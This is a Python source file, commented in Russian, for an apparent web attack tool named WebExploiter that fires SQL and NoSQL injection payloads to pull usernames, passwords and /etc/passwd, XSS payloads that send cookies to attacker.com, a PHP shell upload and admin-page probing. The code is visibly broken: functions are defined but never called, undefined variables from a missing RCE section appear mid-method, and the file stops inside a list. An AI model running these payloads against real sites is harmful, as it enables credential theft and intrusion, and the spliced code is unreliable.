import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs
import logging
import json
from bs4 import BeautifulSoup
import concurrent.futures
import time
import base64
import hashlib
import random
import string
import sqlite3
from datetime import datetime

# настройка логов
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Определяем глобальную переменную для шаблонов поиска результатов команд
COMMAND_PATTERNS = {
    'os_command': [
        # ID команда
        r'uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)',  # Linux id команда
        r'Groups=.+\s+UID=\d+\s+GID=\d+',  # Windows id эквивалент
        
        # LS команда
        r'(total\s+\d+\s+[-d][\w-]{9}\s+\d+\s+[\w-]+\s+[\w-]+\s+\d+\s+\w{3}\s+\d{1,2}\s+\d{1,2}:\d{1,2}\s+[\w.-]+)',
        r'([-d][\w-]{9}\s+\d+\s+[\w-]+\s+[\w-]+\s+\d+\s+\w{3}\s+\d{1,2}\s+\d{4}\s+[\w.-]+)',
        
        # Passwd файл
        r'(root:.*:0:0:.*?:.*?:.*?(\n|$))',
        r'(nobody:.*?:(\d+):.*?:.*?:.*?:.*?(\n|$))',
        
        # Uname команда
        r'Linux\s+\S+\s+\d+\.\d+\.\d+(-\S+)?',
        r'Darwin\s+\S+\s+\d+\.\d+\.\d+',
        r'FreeBSD\s+\S+\s+\d+\.\d+(-\S+)?',
        r'Windows\s+\S+\s+\d+\.\d+\.\d+',
        
        # PS команда
        r'(USER\s+PID\s+%CPU\s+%MEM\s+VSZ\s+RSS\s+TTY\s+STAT\s+START\s+TIME\s+COMMAND)',
        r'((\S+\s+\d+\s+\d+\.\d+\s+\d+\.\d+\s+\d+\s+\d+\s+\?\s+\S+\s+\w{3}\d{2}\s+\d+:\d{2}\s+\S+))',

        # Windows-специфичные команды
        r'Volume\s+in\s+drive\s+[A-Z]\s+is\s+.+',  # результат команды dir
        r'Directory\s+of\s+[A-Z]:\\',  # еще один результат dir
        r'Имя\s+Тип\s+Размер\s+Изменен',  # кириллический Windows dir
        r'[A-Za-z]:\\Windows\\[Ss]ystem32',  # часто встречается в выводе dir
        
        # Netstat команды
        r'(tcp\d?\s+\d+\s+\d+\s+\S+:\d+\s+\S+:\d+\s+\w+)',
        r'(udp\d?\s+\d+\s+\d+\s+\S+:\d+\s+\S+:\d+)',
        
        # IP команды
        r'inet\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
        r'inet6\s+[0-9a-fA-F:]+',
        
        # Результат whoami
        r'(?:[a-zA-Z0-9_-]+\\)?[a-zA-Z0-9_-]+',  # Для Windows домена\пользователя
        
        # Содержимое конфигурационных файлов
        r'(DB_PASSWORD|MYSQL_PASSWORD|PASSWORD|ADMIN_PASSWORD)\s*=\s*[\'"][^\'"]+[\'"]',
        r'(API_KEY|SECRET_KEY|ACCESS_TOKEN)\s*=\s*[\'"][^\'"]+[\'"]'
    ],
    'php_code': [
        r'RCE_TEST',
        r'<\?php',
        r'<\?=',
        r'<html',
        r'<title>phpinfo\(\)</title>',
        r'PHP Version.*?System.*?Build Date',
        r'PHP Variables.*?Environment.*?SERVER\["',
        r'<tr><td class="e">PHP Version</td><td class="v">\d+\.\d+\.\d+',
        r'<tr><td class="e">System</td><td class="v">[^<]+</td></tr>',
        r'<tr><td class="e">SERVER\[\'DOCUMENT_ROOT\'\]</td><td class="v">[^<]+</td></tr>',
        r'<h1 class="p">PHP Version \d+\.\d+\.\d+</h1>',
        r'<h2>PHP License</h2>'
    ],
    'filter_wrappers': [
        r'([A-Za-z0-9+/=]{20,})',  # Base64 encoded content
        r'PD9waHAg',  # <?php в base64
        r'PCFET0NUWVBFIEhUTUw',  # <!DOCTYPE HTML в base64
        r'PGh0bWw',  # <html в base64
        r'Y29uZmlnL2RhdGFiYXNl',  # config/database в base64
        r'ZGF0YWJhc2VfbmFtZQ==',  # database_name в base64
        r'cm9vdA==',  # root в base64
        r'cGFzc3dvcmQ=',  # password в base64
    ],
    'path_traversal': [
        r'(root:.*:0:0:)',
        r'(127\.0\.0\.1\s+localhost)',
        r'(<\?php|<\?=|<html|<!DOCTYPE|<head)',
        r'(config|database|password|host|username|user|dbname|dbuser)',
        r'server-status',
        r'\.htaccess',
        r'sshd_config',
        r'id_rsa',
        r'authorized_keys',
        r'wp-config\.php',
        r'config\.inc\.php',
        r'my\.cnf',
        r'apache2\.conf',
        r'nginx\.conf'
    ]
}

class WebExploiter:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.results = []
        self.vulnerable_points = []
        self.db_connection = None
        self.db_cursor = None

    def exploit_sql_injection(self, url, params=None):
        """внедряем sql и вытаскиваем данные"""
        sql_payloads = {
            'error_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "admin'--",
                "1' OR '1'='1",
                "1' OR 1=1--",
                "1' UNION SELECT NULL--",
                # Добавляем новые payloads для обхода фильтрации
                "\" OR \"1\"=\"1",
                "') OR ('1'='1",
                "')) OR (('1'='1",
                "/**/OR/**/1=1--",
                "'+OR+'1'='1",
                "%27%20OR%201=1--",
                "%bf%27%20OR%201=1--", # Используем UTF-8 encoding
                "UNION/**/SELECT/**/1,2,3--"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' UNION SELECT database(),NULL,NULL--",
                "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--",
                # Добавляем более целенаправленные UNION-инъекции
                "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--",
                "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE()--",
                "' UNION SELECT NULL,NULL,LOAD_FILE('/etc/passwd')--",
                "' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,version(),0x7e)--",
                "' UNION ALL SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata--",
                "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--", # MS SQL
                "' UNION ALL SELECT NULL,@@version,NULL,NULL--"
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SLEEP(5)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                # Добавляем time-based и boolean-based слепые инъекции
                "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "' AND IF(1=1,SLEEP(3),0)--",
                "' AND (SELECT 1 FROM users LIMIT 1)=1--",
                "' AND SUBSTR(@@version,1,1)='5'--",
                "' AND ASCII(SUBSTR((SELECT DATABASE()),1,1))>100--",
                "'; WAITFOR DELAY '0:0:5'--", # MS SQL time-based
                "' AND 1=(SELECT COUNT(*) FROM tabname); --",
                "'; BEGIN DBMS_LOCK.SLEEP(5); END; --", # Oracle time-based
                "' AND 3=3 AND BENCHMARK(1000000,MD5('A'))--", # MySQL heavy query
                "' AND (SELECT pg_sleep(5))--" # PostgreSQL time-based
            ],
            'nosql_injection': [
                '{"$gt":""}',
                '{"username": {"$ne": null}}',
                '{"username": {"$in": ["admin"]}}',
                '{"$where": "sleep(5000)"}',
                '{"$where":"1==1"}',
                '{"$where":"function(){return(true)}"}',
                '{username:{"$regex":"^admin"}}'
            ]
        }
        
        exploited_data = []
        
        def test_payload(payload, field_name, form_url, method):
            try:
                # Сначала получаем обычный ответ для сравнения
                if method == 'post':
                    normal_response = self.session.post(form_url, data={field_name: "normal_value"}, timeout=self.timeout)
                else:
                    normal_response = self.session.get(form_url, params={field_name: "normal_value"}, timeout=self.timeout)
                
                # Затем отправляем payload
                if method == 'post':
                    response = self.session.post(form_url, data={field_name: payload}, timeout=self.timeout)
                else:
                    response = self.session.get(form_url, params={field_name: payload}, timeout=self.timeout)
                
                # Проверяем наличие явных признаков успешной SQL-инъекции
                sql_error_patterns = [
                    'sql syntax', 'mysql error', 'postgresql error', 'sqlite error', 'oracle error',
                    'error in your sql syntax', 'warning: mysql_', 'unclosed quotation mark',
                    'mysql_fetch_array', 'mysql_numrows()', 'mysql_num_rows', 'odbc_exec()',
                    'division by zero in', 'supplied argument is not a valid mysql',
                    # Добавляем дополнительные паттерны для различных СУБД
                    'ORA-\d{5}', 'Microsoft SQL Native Client error', 'Driver.*SQL Server',
                    'SQLSTATE\[\d+', 'PostgreSQL.*ERROR', 'Warning.*pg_', 'valid PostgreSQL result',
                    'Npgsql\.', 'PG::SyntaxError:', 'org\.postgresql\.util\.PSQLException',
                    'ERROR:\s+syntax error at or near', 'ERROR: parser: parse error at or near',
                    'SQLite3::query', 'System\.Data\.SQLite\.SQLiteException', 'SQLite error \d+:',
                    'Warning.*sqlite_', 'MongoDB\sserver\sversion', 'MongoDB\.Driver\.Exception',
                    'Mongoose\.Error\.', 'CouchDB\sError:', 'Redis\scommand\serror'
                ]
                
                # Проверяем наличие явных ошибок SQL
                sql_error_detected = any(pattern.lower() in response.text.lower() for pattern in sql_error_patterns)
                
                # Проверяем на различия в статус-кодах
                status_code_changed = normal_response.status_code != response.status_code
                
                # Проверяем существенное отличие от нормального ответа
                # (например, если появились дополнительные таблицы или записи)
                content_significantly_different = False
                
                # Сравниваем ответы HTML структурно, а не просто по длине
                soup_normal = BeautifulSoup(normal_response.text, 'html.parser')
                soup_payload = BeautifulSoup(response.text, 'html.parser')
                
                # Считаем количество элементов в таблицах и списках
                normal_tables = soup_normal.find_all('table')
                payload_tables = soup_payload.find_all('table')
                normal_lists = soup_normal.find_all(['ul', 'ol'])
                payload_lists = soup_payload.find_all(['ul', 'ol'])
                
                # Если количество табличных элементов сильно отличается - это подозрительно
                if (len(normal_tables) > 0 and len(payload_tables) > len(normal_tables) * 1.5) or \
                   (len(normal_lists) > 0 and len(payload_lists) > len(normal_lists) * 1.5):
                    content_significantly_different = True
                
                # Если обычный ответ и ответ с пейлоадом сильно отличаются и это не ошибка сайта
                if not content_significantly_different and abs(len(response.text) - len(normal_response.text)) > 500 and response.status_code == 200:
                    content_significantly_different = True
                
                # Проверяем наличие числовых маркеров из UNION запросов
                union_markers_found = False
                if "UNION SELECT" in payload.upper() or "UNION ALL SELECT" in payload.upper():
                    # Ищем числовые маркеры в ответе, которые обычно появляются при успешном UNION
                    for marker in ["1,2,3", "1, 2, 3", "1,NULL,NULL", "NULL,NULL,NULL", "~", "0x7e"]:
                        if marker in response.text and marker not in normal_response.text:
                            union_markers_found = True
                            break
                
                # Time-based инъекция (только для blind payloads)
                time_based_detected = False
                if "SLEEP" in payload.upper() or "DELAY" in payload.upper() or "BENCHMARK" in payload.upper() or "pg_sleep" in payload.lower():
                    start_time = time.time()
                    if method == 'post':
                        time_response = self.session.post(form_url, data={field_name: payload}, timeout=self.timeout)
                    else:
                        time_response = self.session.get(form_url, params={field_name: payload}, timeout=self.timeout)
                    execution_time = time.time() - start_time
                    
                    # Если время выполнения больше 2 секунд, возможно, это успешная time-based инъекция
                    # (некоторые из наших payloads содержат SLEEP(3) и выше)
                    if execution_time > 2:
                        time_based_detected = True
                
                # Проверка NoSQL инъекций
                nosql_detected = False
                if payload.startswith('{') and payload.endswith('}'):
                    try:
                        # Преобразуем строку в JSON
                        json_payload = json.loads(payload)
                        
                        # Отправляем JSON payload
                        if method == 'post':
                            json_response = self.session.post(form_url, json=json_payload, timeout=self.timeout)
                        else:
                            # Для GET запроса сериализуем payload
                            params = {field_name: json.dumps(json_payload)}
                            json_response = self.session.get(form_url, params=params, timeout=self.timeout)
                        
                        # Проверяем отличие ответа от нормального
                        if json_response.status_code != normal_response.status_code or \
                           abs(len(json_response.text) - len(normal_response.text)) > 100:
                            nosql_detected = True
                        
                        # Для time-based NoSQL инъекций
                        if '"$where"' in payload and ('sleep' in payload.lower() or 'wait' in payload.lower()):
                            start_time = time.time()
                            if method == 'post':
                                time_response = self.session.post(form_url, json=json_payload, timeout=self.timeout)
                            else:
                                params = {field_name: json.dumps(json_payload)}
                                time_response = self.session.get(form_url, params=params, timeout=self.timeout)
                            execution_time = time.time() - start_time
                            
                            if execution_time > 2:
                                nosql_detected = True
                    except (json.JSONDecodeError, requests.exceptions.RequestException) as e:
                        logger.error(f"Ошибка при проверке NoSQL инъекции: {e}")
                
                # Если обнаружены явные признаки SQL-инъекции
                if sql_error_detected or content_significantly_different or union_markers_found or time_based_detected or nosql_detected:
                    # Пытаемся извлечь данные более конкретными запросами
                    data_payloads = [
                        "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
                        "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
                        "' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password),NULL FROM users--",
                        # Добавляем новые extraction payloads
                        "' UNION SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name)),NULL,NULL FROM information_schema.tables--",
                        "' UNION SELECT GROUP_CONCAT(CONCAT(column_name,'=',column_type)),NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
                        "' UNION SELECT GROUP_CONCAT(username,':',password),NULL,NULL FROM admin--",
                        "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
                        "' UNION SELECT @@datadir,NULL,NULL--"
                    ]
                    
                    data_extracted = False
                    for data_payload in data_payloads:
                        try:
                            if method == 'post':
                                data_response = self.session.post(form_url, data={field_name: data_payload}, timeout=self.timeout)
                            else:
                                data_response = self.session.get(form_url, params={field_name: data_payload}, timeout=self.timeout)
                            
                            # Ищем данные в формате CSV или списка
                            data_patterns = [
                                r'([a-zA-Z0-9_]+(?:,[a-zA-Z0-9_]+){2,})',  # Список значений через запятую
                                r'((?:user|admin|login|name|email|password)[a-zA-Z0-9_]+(?:,[a-zA-Z0-9_]+){2,})',  # Список с ключевыми словами
                                r'([a-zA-Z0-9_]+@[a-zA-Z0-9_\.]+\.[a-zA-Z]{2,})'  # Email-адреса
                            ]
                            
                            for pattern in data_patterns:
                                data_match = re.search(pattern, data_response.text)
                                if data_match and data_match.group(1) not in normal_response.text:
                                    # Дополнительная проверка: убедимся, что найденные данные не являются частью обычного HTML
                                    if not any(html_tag in data_match.group(1).lower() for html_tag in ['<div', '<span', '<p', '<a', '<table']):
                                        exploited_data.append({
                                            'type': 'SQL_INJECTION_DATA',
                                            'url': form_url,
                                            'method': method,
                                            'field': field_name,
                                            'payload': data_payload,
                                            'extracted_data': data_match.group(1)
                                        })
                                        data_extracted = True
                                        break
                            
                            if data_extracted:
                                break
                        except Exception as e:
                            logger.error(f"ошибка при извлечении данных: {e}")
                    
                    # Если нам удалось извлечь данные, считаем SQL-инъекцию успешной
                    if data_extracted:
                        return True
                    
                    # Если данные не извлечены, но есть явные признаки SQL-инъекции,
                    # всё равно добавляем уязвимость, но без извлеченных данных
                    if sql_error_detected:
                        self.vulnerable_points.append({
                            'type': 'SQL_INJECTION',
                            'url': form_url,
                            'method': method,
                            'field': field_name,
                            'payload': payload,
                            'payload_type': 'error_based' if 'error' in payload.lower() else 'union_based' if 'union' in payload.lower() else 'blind'
                        })
                        return True
                
                # Нет явных признаков SQL-инъекции
                return False
            except Exception as e:
                logger.error(f"ошибка при тестировании payload: {e}")
            return False

    def exploit_xss(self, url, params=None):
        """внедряем xss и крадем куки"""
        xss_payloads = [
            '<script>alert(document.cookie)</script>',
            '"><script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
            '"><img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">',
            '"><svg/onload="fetch(\'http://attacker.com?cookie=\'+document.cookie)">',
            'javascript:fetch("http://attacker.com?cookie="+document.cookie)',
            '"><script>new Image().src="http://attacker.com?cookie="+document.cookie</script>',
            # Добавляем усложненные векторы XSS с обходом фильтрации
            '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>',
            '<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>',
            '"><iframe srcdoc="<script>alert(parent.document.cookie)</script>"></iframe>',
            '<div onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))">hover me</div>',
            '<body onload=fetch("//attacker.com/?"+document.cookie)>',
            '"onmouseover="fetch(`//attacker.com?${document.cookie}`)"style="position:fixed;left:0;top:0;width:100%;height:100%;"a="',
            '"><input onfocus="fetch(`//attacker.com?${document.cookie}`)" autofocus>',
            '<noscript><p title="</noscript><img src=x onerror=alert(document.cookie)>">',
            '<math><mi xlink:href="data:x,<script>alert(document.cookie)</script>">',
            '<audio src=x onerror=alert(document.cookie)>',
            '<details open ontoggle=fetch("//attacker.com?"+document.cookie)>',
            '<select autofocus onfocus=alert(document.cookie)>',
            '<marquee onstart=alert(document.cookie)>',
            # DOM-based XSS vectors
            '<script>document.location=\'http://attacker.com?c=\'+document.cookie</script>',
            '"><a href="javascript:fetch(\'//attacker.com?c=\'+document.cookie)">Click me</a>',
            '#<img src=x onerror=alert(document.cookie)>', # Hash fragment XSS
            '?param=<script>alert(document.cookie)</script>', # Query parameter XSS
            'javascript:alert(document.cookie);', # URL-based XSS
            '"><button onclick="alert(document.cookie)">Click me</button>',
            '<link rel=import href="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+">'
        ]
        
        exploited_data = []
        
        def test_payload(payload, field_name, form_url, method):
            try:
                # Сначала получаем обычный ответ для сравнения
                if method == 'post':
                    normal_response = self.session.post(form_url, data={field_name: "normal_value"}, timeout=self.timeout)
                else:
                    normal_response = self.session.get(form_url, params={field_name: "normal_value"}, timeout=self.timeout)
                
                # Затем отправляем payload
                if method == 'post':
                    response = self.session.post(form_url, data={field_name: payload}, timeout=self.timeout)
                else:
                    response = self.session.get(form_url, params={field_name: payload}, timeout=self.timeout)
                
                # Получаем исходный HTML ответа
                html_content = response.text
                
                # Проверяем, отражается ли payload в ответе
                # Важно проверить, что payload отражается именно в HTML, а не в JavaScript или атрибутах
                reflected_payload = False
                
                # Проверяем на частичное совпадение, убирая пробелы и переносы
                payload_normalized = ''.join(payload.split())
                html_normalized = ''.join(html_content.split())
                
                if payload_normalized in html_normalized:
                    reflected_payload = True
                
                if not reflected_payload:
                    # Ищем ключевые части payload
                    payload_parts = []
                    if '<script>' in payload:
                        payload_parts.append('<script>')
                    if 'onerror=' in payload:
                        payload_parts.append('onerror=')
                    if 'onload=' in payload:
                        payload_parts.append('onload=')
                    if 'fetch(' in payload:
                        payload_parts.append('fetch(')
                    if 'eval(' in payload:
                        payload_parts.append('eval(')
                    if 'alert(' in payload:
                        payload_parts.append('alert(')
                    if 'document.cookie' in payload:
                        payload_parts.append('document.cookie')
                    
                    # Если найдены ключевые части, считаем, что payload частично отражается
                    if payload_parts and all(part in html_content for part in payload_parts):
                        reflected_payload = True
                
                if reflected_payload:
                    # Проверяем, не заэкранирован ли payload
                    escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                    if escaped_payload in html_content:
                        # Если payload заэкранирован, XSS не сработает
                        return False
                    
                    # Проверяем наличие Content-Security-Policy в заголовках
                    csp_enabled = False
                    if 'Content-Security-Policy' in response.headers:
                        csp = response.headers['Content-Security-Policy']
                        # Проверяем, блокирует ли CSP inline scripts или eval
                        if "script-src 'none'" in csp or "default-src 'none'" in csp:
                            csp_enabled = True
                        elif "script-src" in csp and "'unsafe-inline'" not in csp and "'unsafe-eval'" not in csp:
                            csp_enabled = True
                    
                    if csp_enabled:
                        # Проверяем, содержит ли payload обход CSP
                        csp_bypass = False
                        if any(bypass in payload.lower() for bypass in ['base-uri', 'object-src', 'require-trusted-types-for']):
                            csp_bypass = True
                        
                        if not csp_bypass:
                            logger.info(f"CSP предотвращает XSS для {form_url}, payload: {payload}")
                            return False
                    
                    # Проверяем, что payload отражается вне контекста атрибутов
                    soup = BeautifulSoup(html_content, 'html.parser')
                    
                    # Проверка DOM-based XSS
                    dom_xss_detected = False
                    
                    # Анализируем скрипты на странице
                    script_tags = soup.find_all('script')
                    for script in script_tags:
                        script_content = script.string if script.string else ""
                        
                        # Ищем потенциально опасные паттерны в скриптах
                        dangerous_patterns = [
                            'document.location', 'location.href', 'location.hash', 'location.search',
                            'window.name', 'document.referrer', 'document.URL', 'document.documentURI',
                            'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write', 'document.writeln',
                            'eval(', 'setTimeout(', 'setInterval(', 'Function(', 'execScript('
                        ]
                        
                        if any(pattern in script_content for pattern in dangerous_patterns):
                            # Если в скрипте есть опасные паттерны, проверяем, манипулирует ли он DOM
                            dom_manipulation = False
                            dom_manipulation_patterns = [
                                'getElementById', 'getElementsByTagName', 'getElementsByClassName',
                                'querySelector', 'querySelectorAll', 'createElement', 'appendChild',
                                'insertBefore', 'replaceChild', 'removeChild', 'cloneNode'
                            ]
                            
                            if any(pattern in script_content for pattern in dom_manipulation_patterns):
                                dom_manipulation = True
                            
                            # Если скрипт использует пользовательский ввод и манипулирует DOM,
                            # это потенциальная DOM-based XSS
                            if dom_manipulation and field_name in script_content:
                                dom_xss_detected = True
                                break
                    
                    # Ищем script тег, если он присутствует в payload
                    script_found = False
                    if '<script>' in payload:
                        script_tags = soup.find_all('script')
                        for script in script_tags:
                            if script.string and any(keyword in script.string for keyword in ['alert(', 'fetch(', 'document.cookie']):
                                script_found = True
                                break
                    else:
                        # Если <script> не в payload, считаем, что мы не ищем именно его
                        script_found = True
                    
                    # Ищем атрибуты onerror/onload, если они присутствуют в payload
                    event_handler_found = False
                    if any(attr in payload for attr in ['onerror=', 'onload=', 'onclick=', 'onmouseover=', 'onfocus=']):
                        for tag in soup.find_all():
                            for attr in tag.attrs:
                                if attr.startswith('on') and any(keyword in str(tag[attr]) for keyword in ['alert', 'fetch', 'document.cookie']):
                                    event_handler_found = True
                                    break
                            if event_handler_found:
                                break
                    else:
                        # Если обработчиков событий нет в payload, считаем, что мы не ищем их
                        event_handler_found = True
                    
                    # Для iframe и srcdoc атрибутов
                    iframe_injection = False
                    if '<iframe' in payload and 'srcdoc=' in payload:
                        iframe_tags = soup.find_all('iframe')
                        for iframe in iframe_tags:
                            if iframe.has_attr('srcdoc') and '<script>' in iframe['srcdoc']:
                                iframe_injection = True
                                break
                    
                    # Если это потенциальная DOM-based XSS или reflected XSS,
                    # и необходимые элементы payload отражаются в ответе
                    if (dom_xss_detected or (script_found and event_handler_found) or iframe_injection):
                        # Создаем уникальный id для отслеживания
                        tracking_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                        tracking_payload = f'<script>fetch("http://attacker.com?track={tracking_id}&cookie="+document.cookie)</script>'
                        
                        try:
                            if method == 'post':
                                self.session.post(form_url, data={field_name: tracking_payload}, timeout=self.timeout)
                            else:
                                self.session.get(form_url, params={field_name: tracking_payload}, timeout=self.timeout)
                            
                            # Определяем тип XSS
                            xss_type = "DOM-based XSS" if dom_xss_detected else "Reflected XSS"
                            if iframe_injection:
                                xss_type += " (iframe injection)"
                            
                            exploited_data.append({
                                'type': 'XSS_EXPLOITED',
                                'url': form_url,
                                'method': method,
                                'field': field_name,
                                'payload': tracking_payload,
                                'original_payload': payload,
                                'tracking_id': tracking_id,
                                'xss_type': xss_type
                            })
                        except Exception as e:
                            logger.error(f"ошибка при отправке tracking payload: {e}")
                        
                        return True
                
                # Проверка DOM-based XSS с использованием URL hash
                if any(fragment in payload for fragment in ['#<img', '#<script', '#javascript:']):
                    hash_url = form_url + payload
                    try:
                        hash_response = self.session.get(hash_url, timeout=self.timeout)
                        # Простая эвристика: если ответ имеет статус 200 и содержит JS код,
                        # есть вероятность DOM-based XSS
                        if hash_response.status_code == 200 and len(hash_response.text) > 0:
                            script_tags = BeautifulSoup(hash_response.text, 'html.parser').find_all('script')
                            if script_tags and any('location.hash' in (script.string or '') for script in script_tags):
                                exploited_data.append({
                                    'type': 'XSS_EXPLOITED',
                                    'url': hash_url,
                                    'method': 'get',
                                    'field': 'hash_fragment',
                                    'payload': payload,
                                    'xss_type': 'DOM-based XSS (URL fragment)'
                                })
                                return True
                    except Exception as e:
                        logger.error(f"ошибка при проверке DOM-based XSS (URL hash): {e}")
                
                return False
            except Exception as e:
                logger.error(f"ошибка при тестировании xss payload: {e}")
            return False

        # ищем формы если параметры не указаны
        if not params:
            try:
                response = self.session.get(url, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'get').lower()
                    form_url = urljoin(url, form_action)
                    
                    # собираем поля формы
                    form_fields = {}
                    for input_field in form.find_all(['input', 'textarea']):
                        if input_field.get('name'):
                            form_fields[input_field.get('name')] = input_field.get('value', '')
                    
                    # тестируем каждое поле
                    for field_name in form_fields:
                        for payload in xss_payloads:
                            if test_payload(payload, field_name, form_url, form_method):
                                self.vulnerable_points.append({
                                    'type': 'XSS',
                                    'url': form_url,
                                    'method': form_method,
                                    'field': field_name,
                                    'payload': payload
                                })
            except Exception as e:
                logger.error(f"ошибка при анализе форм для RCE: {e}")
        
        # проверяем URL-параметры
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param_name, param_values in query_params.items():
                # проверяем только поля с названиями, чувствительными к RCE
                is_sensitive_param = any(param in param_name.lower() for param in sensitive_params)
                
                if is_sensitive_param or param_name.lower() in ['q', 'search', 'query', 'id', 'page']:
                    for payload_type, payloads in rce_payloads.items():
                        for payload in payloads:
                            if test_payload(payload, param_name, url, 'get', payload_type):
                                self.vulnerable_points.append({
                                    'type': 'RCE',
                                    'url': url,
                                    'method': 'GET',
                                    'field': param_name,
                                    'payload': payload,
                                    'payload_type': payload_type
                                })
        except Exception as e:
            logger.error(f"ошибка при анализе URL-параметров для RCE: {e}")
        
        # проверяем специальные пути для загрузки файлов и инклудов
        special_paths = [
            '/upload.php', '/upload', '/uploads', '/fileupload',
            '/inc.php', '/include.php', '/require.php', '/require_once.php', '/includes',
            '/admin/upload.php', '/admin/uploads', '/admin/filemanager'
        ]
        
        for path in special_paths:
            test_url = urljoin(url, path)
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                if response.status_code == 200:
                    # нашли потенциальную точку загрузки/инклуда
                    for payload_type, payloads in rce_payloads.items():
                        if payload_type in ['filter_wrappers', 'path_traversal']:
                            for payload in payloads:
                                if 'file' in test_url.lower() or 'upload' in test_url.lower():
                                    # симулируем загрузку файла с RCE содержимым
                                    files = {'file': ('shell.php', '<?php echo "RCE_TEST"; ?>')}
                                    try:
                                        upload_response = self.session.post(test_url, files=files, timeout=self.timeout)
                                        
                                        # Убедимся, что загрузка прошла успешно
                                        success_indicators = [
                                            'RCE_TEST',
                                            'успешно загружен',
                                            'upload successful',
                                            'file uploaded'
                                        ]
                                        
                                        if any(indicator in upload_response.text.lower() for indicator in success_indicators):
                                            exploited_data.append({
                                                'type': 'RCE_EXPLOITED',
                                                'url': test_url,
                                                'method': 'POST',
                                                'field': 'file',
                                                'payload': '<?php echo "RCE_TEST"; ?>',
                                                'payload_type': 'file_upload',
                                                'extracted_data': 'File upload vulnerability - PHP shell was uploaded successfully'
                                            })
                                    except Exception as upload_error:
                                        logger.error(f"ошибка при проверке загрузки файла: {upload_error}")
                                else:
                                    # для инклудов пробуем просто добавить параметр
                                    include_test_url = f"{test_url}?file={payload}"
                                    try:
                                        # Сначала получаем обычный ответ для сравнения
                                        normal_include_response = self.session.get(test_url, timeout=self.timeout)
                                        
                                        # Затем отправляем запрос с payload
                                        include_response = self.session.get(include_test_url, timeout=self.timeout)
                                        
                                        # Проверяем существенное отличие от нормального ответа
                                        if include_response.text != normal_include_response.text:
                                            for pattern in COMMAND_PATTERNS.get(payload_type, []):
                                                match = re.search(pattern, include_response.text, re.MULTILINE)
                                                if match and match.group(0) not in normal_include_response.text:
                                                    exploited_data.append({
                                                        'type': 'RCE_EXPLOITED',
                                                        'url': include_test_url,
                                                        'method': 'GET',
                                                        'field': 'file',
                                                        'payload': payload,
                                                        'payload_type': 'include',
                                                        'extracted_data': f"File inclusion vulnerability - Pattern matched: {match.group(0)[:100]}"
                                                    })
                                                    break
                                    except Exception as include_error:
                                        logger.error(f"ошибка при проверке инклуда: {include_error}")
            except Exception as e:
                logger.error(f"ошибка при проверке специального пути {test_url}: {e}")
        
        return exploited_data

    def exploit_admin_pages(self):
        """ищем и взламываем админки"""
        admin_paths = [
            '/admin', '/administrator', '/admin.php', '/admin.html',
            '/admin/login', '/admin/dashboard', '/admin/index',
            '/wp-admin', '/wp-login.php', '/administrator/index.php',
            '/admincp', '/adm', '/admin/login.php', '/admin/index.php',
            '/admin/admin.php', '/admin_area/admin.php', '/admin_area/login.php',
            '/siteadmin/login.php', '/siteadmin/index.php', '/siteadmin/login.html',
            '/admin/account.php', '/admin_area/index.php', '/bb-admin/index.php',
            '/adminHome', '/admin_area/admin.php', '/admin/controlpanel.php',
            '/admin/cp.php', '/cp.php', '/administrator/index.php',
            '/nsw/admin/login.php', '/webadmin', '/adminarea',
            '/bb-admin/index.php', '/adminHome', '/admin_area/admin.php',
            '/admin/controlpanel.php', '/admin/cp.php', '/cp.php',
            '/administrator/index.php', '/nsw/admin/login.php', '/webadmin',
            '/adminarea', '/phpmyadmin', '/phpMyAdmin', '/phpmyadmin0',
